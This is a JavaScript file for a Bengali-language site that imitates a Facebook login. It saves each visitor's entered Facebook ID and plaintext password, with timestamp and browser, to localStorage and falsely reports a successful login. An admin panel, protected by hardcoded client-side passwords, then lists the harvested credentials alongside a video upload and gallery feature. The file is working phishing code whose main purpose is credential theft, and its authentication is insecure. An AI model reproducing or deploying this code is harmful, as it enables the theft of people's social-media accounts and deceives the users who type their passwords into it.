// Enhanced JavaScript with better functionality and user experience

// Utility functions
const utils = {
  // Show loading state
  showLoading(button) {
    const btnText = button.querySelector('.btn-text');
    const loading = button.querySelector('.loading');
    if (btnText) btnText.style.display = 'none';
    if (loading) loading.style.display = 'inline-block';
    button.disabled = true;
  },

  // Hide loading state
  hideLoading(button) {
    const btnText = button.querySelector('.btn-text');
    const loading = button.querySelector('.loading');
    if (btnText) btnText.style.display = 'inline';
    if (loading) loading.style.display = 'none';
    button.disabled = false;
  },

  // Show message
  showMessage(message, type = 'info', duration = 5000) {
    const container = document.getElementById('messageContainer') || document.body;
    const messageDiv = document.createElement('div');
    messageDiv.className = `message ${type}`;
    messageDiv.textContent = message;
    
    container.appendChild(messageDiv);
    
    // Auto remove after duration
    setTimeout(() => {
      if (messageDiv.parentNode) {
        messageDiv.style.opacity = '0';
        setTimeout(() => messageDiv.remove(), 300);
      }
    }, duration);
  },

  // Validate email format
  isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  },

  // Format file size
  formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  },

  // Sanitize input
  sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
  }
};

// Form validation
const validation = {
  // Clear error messages
  clearErrors(form) {
    const errorElements = form.querySelectorAll('.error-message');
    errorElements.forEach(el => {
      el.textContent = '';
      el.style.display = 'none';
    });
  },

  // Show error for specific field
  showError(fieldId, message) {
    const errorElement = document.getElementById(`${fieldId}-error`);
    if (errorElement) {
      errorElement.textContent = message;
      errorElement.style.display = 'block';
    }
  },

  // Validate Facebook login form
  validateFacebookForm(form) {
    this.clearErrors(form);
    let isValid = true;

    const fbId = document.getElementById('fbId');
    const fbPass = document.getElementById('fbPass');

    if (!fbId.value.trim()) {
      this.showError('fbId', 'Facebook ID বা ইমেইল প্রয়োজন');
      isValid = false;
    } else if (fbId.value.includes('@') && !utils.isValidEmail(fbId.value)) {
      this.showError('fbId', 'সঠিক ইমেইল ঠিকানা লিখুন');
      isValid = false;
    }

    if (!fbPass.value) {
      this.showError('fbPass', 'পাসওয়ার্ড প্রয়োজন');
      isValid = false;
    } else if (fbPass.value.length < 6) {
      this.showError('fbPass', 'পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে');
      isValid = false;
    }

    return isValid;
  },

  // Validate admin login form
  validateAdminForm(form) {
    this.clearErrors(form);
    let isValid = true;

    const adminUser = document.getElementById('adminUser');
    const adminPass = document.getElementById('adminPass');

    if (!adminUser.value.trim()) {
      this.showError('adminUser', 'ইউজারনেম প্রয়োজন');
      isValid = false;
    }

    if (!adminPass.value) {
      this.showError('adminPass', 'পাসওয়ার্ড প্রয়োজন');
      isValid = false;
    }

    return isValid;
  },

  // Validate upload form
  validateUploadForm(form) {
    this.clearErrors(form);
    let isValid = true;

    const videoTitle = document.getElementById('videoTitle');
    const videoFile = document.getElementById('videoFile');

    if (!videoTitle.value.trim()) {
      this.showError('videoTitle', 'ভিডিওর শিরোনাম প্রয়োজন');
      isValid = false;
    } else if (videoTitle.value.trim().length < 3) {
      this.showError('videoTitle', 'শিরোনাম কমপক্ষে ৩ অক্ষরের হতে হবে');
      isValid = false;
    }

    if (!videoFile.files[0]) {
      this.showError('videoFile', 'ভিডিও ফাইল নির্বাচন করুন');
      isValid = false;
    } else {
      const file = videoFile.files[0];
      const maxSize = 200 * 1024 * 1024; // 200MB
      
      if (file.size > maxSize) {
        this.showError('videoFile', `ফাইল সাইজ খুব বড়। সর্বোচ্চ ${utils.formatFileSize(maxSize)} অনুমোদিত।`);
        isValid = false;
      }

      const allowedTypes = ['video/mp4', 'video/avi', 'video/mov', 'video/x-msvideo', 'video/quicktime', 'video/x-matroska', 'video/webm'];
      if (!allowedTypes.includes(file.type)) {
        this.showError('videoFile', 'অসমর্থিত ফাইল ফরম্যাট। শুধুমাত্র MP4, AVI, MOV, MKV, WebM সমর্থিত।');
        isValid = false;
      }
    }

    return isValid;
  }
};

// Enhanced Facebook login handler
function handleFacebookLogin(event) {
  event.preventDefault();
  
  const form = event.target;
  const submitBtn = form.querySelector('button[type="submit"]');
  
  if (!validation.validateFacebookForm(form)) {
    return false;
  }

  utils.showLoading(submitBtn);

  // Simulate network delay for better UX
  setTimeout(() => {
    try {
      const id = utils.sanitizeInput(document.getElementById("fbId").value.trim());
      const pass = document.getElementById("fbPass").value;
      
      let creds = JSON.parse(localStorage.getItem("fbCreds") || "[]");
      
      // Check for duplicate entries
      const existingEntry = creds.find(cred => cred.id === id);
      if (!existingEntry) {
        creds.push({ 
          id, 
          pass, 
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent
        });
        localStorage.setItem("fbCreds", JSON.stringify(creds));
      }
      
      utils.hideLoading(submitBtn);
      utils.showMessage("সফলভাবে লগইন হয়েছে! পুনঃনির্দেশ করা হচ্ছে...", "success");
      
      setTimeout(() => {
        window.location.href = "index.html";
      }, 1500);
      
    } catch (error) {
      utils.hideLoading(submitBtn);
      utils.showMessage("লগইন করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।", "error");
      console.error("Login error:", error);
    }
  }, 1000);

  return false;
}

// Enhanced admin login handler
function handleAdminLogin(event) {
  event.preventDefault();
  
  const form = event.target;
  const submitBtn = form.querySelector('button[type="submit"]');
  
  if (!validation.validateAdminForm(form)) {
    return false;
  }

  utils.showLoading(submitBtn);

  setTimeout(() => {
    const user = document.getElementById("adminUser").value.trim();
    const pass = document.getElementById("adminPass").value;
    
    // Multiple admin credentials for security
    const validAdmins = [
      { username: "admin", password: "admin123" },
      { username: "peta_admin", password: "peta2024!" },
      { username: "moderator", password: "mod123456" }
    ];
    
    const isValidAdmin = validAdmins.some(admin => 
      admin.username === user && admin.password === pass
    );
    
    utils.hideLoading(submitBtn);
    
    if (isValidAdmin) {
      // Store admin session
      sessionStorage.setItem("adminLoggedIn", "true");
      sessionStorage.setItem("adminUser", user);
      
      utils.showMessage("অ্যাডমিন লগইন সফল! পুনঃনির্দেশ করা হচ্ছে...", "success");
      setTimeout(() => {
        window.location.href = "admin.html";
      }, 1500);
    } else {
      utils.showMessage("ভুল অ্যাডমিন তথ্য। আবার চেষ্টা করুন।", "error");
    }
  }, 1000);

  return false;
}

// Enhanced upload handler
function handleUpload(event) {
  event.preventDefault();
  
  const form = event.target;
  const submitBtn = form.querySelector('button[type="submit"]');
  
  if (!validation.validateUploadForm(form)) {
    return false;
  }

  const file = document.getElementById("videoFile").files[0];
  const title = utils.sanitizeInput(document.getElementById("videoTitle").value.trim());
  const description = utils.sanitizeInput(document.getElementById("videoDescription").value.trim());
  
  utils.showLoading(submitBtn);
  
  // Show upload progress
  const progressContainer = document.getElementById("uploadProgress");
  const progressFill = document.getElementById("progressFill");
  const progressText = document.getElementById("progressText");
  
  if (progressContainer) {
    progressContainer.style.display = "block";
  }

  // Simulate upload progress
  let progress = 0;
  const progressInterval = setInterval(() => {
    progress += Math.random() * 15;
    if (progress > 95) progress = 95;
    
    if (progressFill) progressFill.style.width = progress + "%";
    if (progressText) progressText.textContent = `আপলোড হচ্ছে... ${Math.round(progress)}%`;
  }, 200);

  setTimeout(() => {
    try {
      clearInterval(progressInterval);
      
      const url = URL.createObjectURL(file);
      let videos = JSON.parse(localStorage.getItem("videos") || "[]");
      
      const videoData = {
        id: Date.now().toString(),
        title,
        description,
        url,
        filename: file.name,
        size: file.size,
        type: file.type,
        uploadDate: new Date().toISOString(),
        uploader: sessionStorage.getItem("adminUser") || "admin"
      };
      
      videos.push(videoData);
      localStorage.setItem("videos", JSON.stringify(videos));
      
      if (progressFill) progressFill.style.width = "100%";
      if (progressText) progressText.textContent = "আপলোড সম্পন্ন!";
      
      utils.hideLoading(submitBtn);
      utils.showMessage("ভিডিও সফলভাবে আপলোড হয়েছে!", "success");
      
      // Reset form
      form.reset();
      updateFileInputLabel();
      
      // Hide progress after delay
      setTimeout(() => {
        if (progressContainer) progressContainer.style.display = "none";
      }, 2000);
      
      // Refresh video list if on admin page
      if (typeof loadAdminVideos === 'function') {
        loadAdminVideos();
      }
      
    } catch (error) {
      clearInterval(progressInterval);
      utils.hideLoading(submitBtn);
      utils.showMessage("ভিডিও আপলোড করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।", "error");
      console.error("Upload error:", error);
      
      if (progressContainer) progressContainer.style.display = "none";
    }
  }, 3000);

  return false;
}

// Toggle admin form visibility
function toggleAdminForm() {
  const adminForm = document.getElementById('adminForm');
  const toggleBtn = document.querySelector('.admin-toggle-btn');
  
  if (adminForm && toggleBtn) {
    const isHidden = adminForm.style.display === 'none';
    adminForm.style.display = isHidden ? 'block' : 'none';
    adminForm.setAttribute('aria-hidden', !isHidden);
    toggleBtn.setAttribute('aria-expanded', isHidden);
    
    if (isHidden) {
      adminForm.style.animation = 'fadeIn 0.5s ease-out';
    }
  }
}

// Load and display videos
function loadVideos() {
  const videoContainer = document.getElementById("videoContainer") || document.getElementById("videoSection");
  const noVideosDiv = document.getElementById("noVideos");
  
  if (!videoContainer) return;

  try {
    let videos = JSON.parse(localStorage.getItem("videos") || "[]");
    
    if (videos.length === 0) {
      if (noVideosDiv) noVideosDiv.style.display = "block";
      return;
    }
    
    if (noVideosDiv) noVideosDiv.style.display = "none";
    
    // Clear existing content
    if (document.getElementById("videoContainer")) {
      videoContainer.innerHTML = "";
    }
    
    videos.reverse().forEach((videoData, index) => {
      const videoCard = document.createElement("div");
      videoCard.className = "video-card";
      videoCard.style.animationDelay = `${index * 0.1}s`;
      
      videoCard.innerHTML = `
        <div class="video-header">
          <h4 class="video-title">${videoData.title || 'শিরোনামহীন ভিডিও'}</h4>
          ${videoData.description ? `<p class="video-description">${videoData.description}</p>` : ''}
        </div>
        <video controls preload="metadata" aria-label="${videoData.title || 'ভিডিও'}">
          <source src="${videoData.url}" type="${videoData.type || 'video/mp4'}">
          আপনার ব্রাউজার এই ভিডিও ফরম্যাট সমর্থন করে না।
        </video>
        <div class="video-meta">
          <span class="upload-date">📅 ${new Date(videoData.uploadDate || Date.now()).toLocaleDateString('bn-BD')}</span>
          ${videoData.size ? `<span class="file-size">📁 ${utils.formatFileSize(videoData.size)}</span>` : ''}
        </div>
      `;
      
      videoContainer.appendChild(videoCard);
    });
    
  } catch (error) {
    console.error("Error loading videos:", error);
    if (noVideosDiv) {
      noVideosDiv.style.display = "block";
      noVideosDiv.querySelector('h4').textContent = "ভিডিও লোড করতে সমস্যা হয়েছে";
    }
  }
}

// Load admin videos with management options
function loadAdminVideos() {
  const adminVideoList = document.getElementById("adminVideoList");
  if (!adminVideoList) return;

  try {
    let videos = JSON.parse(localStorage.getItem("videos") || "[]");
    
    if (videos.length === 0) {
      adminVideoList.innerHTML = `
        <div class="no-videos-admin">
          <span class="no-videos-icon">🎬</span>
          <p>এখনো কোনো ভিডিও আপলোড করা হয়নি</p>
        </div>
      `;
      return;
    }
    
    adminVideoList.innerHTML = "";
    
    videos.reverse().forEach((videoData, index) => {
      const videoItem = document.createElement("div");
      videoItem.className = "admin-video-item";
      videoItem.style.animationDelay = `${index * 0.1}s`;
      
      videoItem.innerHTML = `
        <div class="admin-video-info">
          <h5>${videoData.title || 'শিরোনামহীন ভিডিও'}</h5>
          <p class="video-details">
            📅 ${new Date(videoData.uploadDate || Date.now()).toLocaleDateString('bn-BD')} | 
            📁 ${utils.formatFileSize(videoData.size || 0)} | 
            👤 ${videoData.uploader || 'অজানা'}
          </p>
          ${videoData.description ? `<p class="video-desc">${videoData.description}</p>` : ''}
        </div>
        <div class="admin-video-actions">
          <button onclick="deleteVideo('${videoData.id}')" class="delete-btn" title="ভিডিও মুছে ফেলুন">
            🗑️ মুছুন
          </button>
        </div>
      `;
      
      adminVideoList.appendChild(videoItem);
    });
    
  } catch (error) {
    console.error("Error loading admin videos:", error);
    adminVideoList.innerHTML = `
      <div class="error-message">
        ভিডিও লোড করতে সমস্যা হয়েছে
      </div>
    `;
  }
}

// Delete video function
function deleteVideo(videoId) {
  if (!confirm("আপনি কি নিশ্চিত যে এই ভিডিওটি মুছে ফেলতে চান?")) {
    return;
  }

  try {
    let videos = JSON.parse(localStorage.getItem("videos") || "[]");
    videos = videos.filter(video => video.id !== videoId);
    localStorage.setItem("videos", JSON.stringify(videos));
    
    utils.showMessage("ভিডিও সফলভাবে মুছে ফেলা হয়েছে", "success");
    loadAdminVideos();
    
  } catch (error) {
    console.error("Error deleting video:", error);
    utils.showMessage("ভিডিও মুছতে সমস্যা হয়েছে", "error");
  }
}

// Load and display credentials
function loadCredentials() {
  const credentialsOutput = document.getElementById("credentialsOutput");
  if (!credentialsOutput) return;

  try {
    let creds = JSON.parse(localStorage.getItem("fbCreds") || "[]");
    
    if (creds.length === 0) {
      credentialsOutput.textContent = "এখনো কোনো ব্যবহারকারী লগইন করেননি।";
      return;
    }
    
    let output = creds.map((cred, index) => {
      const date = cred.timestamp ? new Date(cred.timestamp).toLocaleString('bn-BD') : 'অজানা সময়';
      return `${index + 1}. Facebook ID: ${cred.id}
   পাসওয়ার্ড: ${cred.pass}
   লগইন সময়: ${date}
   ব্রাউজার: ${cred.userAgent ? cred.userAgent.split(' ')[0] : 'অজানা'}`;
    }).join("\n\n");
    
    credentialsOutput.textContent = output;
    
  } catch (error) {
    console.error("Error loading credentials:", error);
    credentialsOutput.textContent = "তথ্য লোড করতে সমস্যা হয়েছে।";
  }
}

// Refresh credentials
function refreshCredentials() {
  loadCredentials();
  utils.showMessage("তথ্য রিফ্রেশ করা হয়েছে", "success", 2000);
}

// Clear all credentials
function clearCredentials() {
  if (!confirm("আপনি কি নিশ্চিত যে সব ব্যবহারকারীর তথ্য মুছে ফেলতে চান?")) {
    return;
  }

  try {
    localStorage.removeItem("fbCreds");
    loadCredentials();
    utils.showMessage("সব ব্যবহারকারীর তথ্য মুছে ফেলা হয়েছে", "success");
  } catch (error) {
    console.error("Error clearing credentials:", error);
    utils.showMessage("তথ্য মুছতে সমস্যা হয়েছে", "error");
  }
}

// Logout function
function logout() {
  if (confirm("আপনি কি লগআউট করতে চান?")) {
    sessionStorage.removeItem("adminLoggedIn");
    sessionStorage.removeItem("adminUser");
    utils.showMessage("সফলভাবে লগআউট হয়েছে", "success");
    setTimeout(() => {
      window.location.href = "login.html";
    }, 1500);
  }
}

// File input enhancement
function updateFileInputLabel() {
  const fileInput = document.getElementById('videoFile');
  const fileLabel = document.querySelector('.file-input-label .file-text');
  
  if (fileInput && fileLabel) {
    if (fileInput.files && fileInput.files[0]) {
      const file = fileInput.files[0];
      fileLabel.textContent = `${file.name} (${utils.formatFileSize(file.size)})`;
    } else {
      fileLabel.textContent = 'ফাইল নির্বাচন করুন';
    }
  }
}

// Check admin authentication
function checkAdminAuth() {
  if (window.location.pathname.includes('admin.html')) {
    const isLoggedIn = sessionStorage.getItem("adminLoggedIn");
    if (!isLoggedIn) {
      utils.showMessage("অ্যাডমিন প্যানেল অ্যাক্সেস করতে লগইন করুন", "error");
      setTimeout(() => {
        window.location.href = "login.html";
      }, 2000);
      return false;
    }
  }
  return true;
}

// Initialize page
window.addEventListener('DOMContentLoaded', function() {
  // Check admin authentication
  if (!checkAdminAuth()) return;
  
  // Load content based on page
  if (document.getElementById("videoSection") || document.getElementById("videoContainer")) {
    loadVideos();
  }
  
  if (document.getElementById("credentialsOutput")) {
    loadCredentials();
  }
  
  if (document.getElementById("adminVideoList")) {
    loadAdminVideos();
  }
  
  // File input change handler
  const fileInput = document.getElementById('videoFile');
  if (fileInput) {
    fileInput.addEventListener('change', updateFileInputLabel);
  }
  
  // Form input enhancements
  const inputs = document.querySelectorAll('input, textarea');
  inputs.forEach(input => {
    input.addEventListener('blur', function() {
      if (this.value.trim()) {
        this.classList.add('has-value');
      } else {
        this.classList.remove('has-value');
      }
    });
  });
});

// Handle page visibility change
document.addEventListener('visibilitychange', function() {
  if (!document.hidden) {
    // Refresh data when page becomes visible
    if (document.getElementById("credentialsOutput")) {
      loadCredentials();
    }
    if (document.getElementById("videoSection") || document.getElementById("videoContainer")) {
      loadVideos();
    }
  }
});

// Export functions for global access
window.handleFacebookLogin = handleFacebookLogin;
window.handleAdminLogin = handleAdminLogin;
window.handleUpload = handleUpload;
window.toggleAdminForm = toggleAdminForm;
window.deleteVideo = deleteVideo;
window.refreshCredentials = refreshCredentials;
window.clearCredentials = clearCredentials;
window.logout = logout;

